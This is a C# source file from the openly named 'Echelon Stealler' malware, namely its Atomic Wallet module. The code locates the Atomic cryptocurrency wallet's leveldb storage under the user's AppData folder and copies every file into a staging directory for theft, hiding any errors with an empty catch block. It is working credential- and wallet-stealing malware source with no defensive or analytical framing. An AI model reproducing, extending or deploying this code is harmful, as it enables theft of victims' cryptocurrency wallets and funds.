///////////////////////////////////////////////////////
//Echelon Stealler, C# Malware Systems by MadСod v1.4.2//
///////////////////////////////////////////////////////

using System.IO;

namespace Echelon
{
    internal class AtomicWallet
    {
        public static int count;

        //AtomicWallet, AtomicWallet 2.8.0
        public static string atomDir = "\\Wallets\\Atomic\\Local Storage\\leveldb\\";
        public static string atomDir2 = Help.AppDate + "\\atomic\\Local Storage\\leveldb\\";

        public static void AtomicStr(string directorypath)  // Works
        {
            try
            {
                if (Directory.Exists(atomDir2))
                {
                    foreach (var file in new DirectoryInfo(atomDir2).GetFiles())

                    {
                        Directory.CreateDirectory(directorypath + atomDir);
                        file.CopyTo(directorypath + atomDir + file.Name);
                    }
                    count++;
                    Wallets.count++;
                }
            }
            catch { }

        }
    }
}
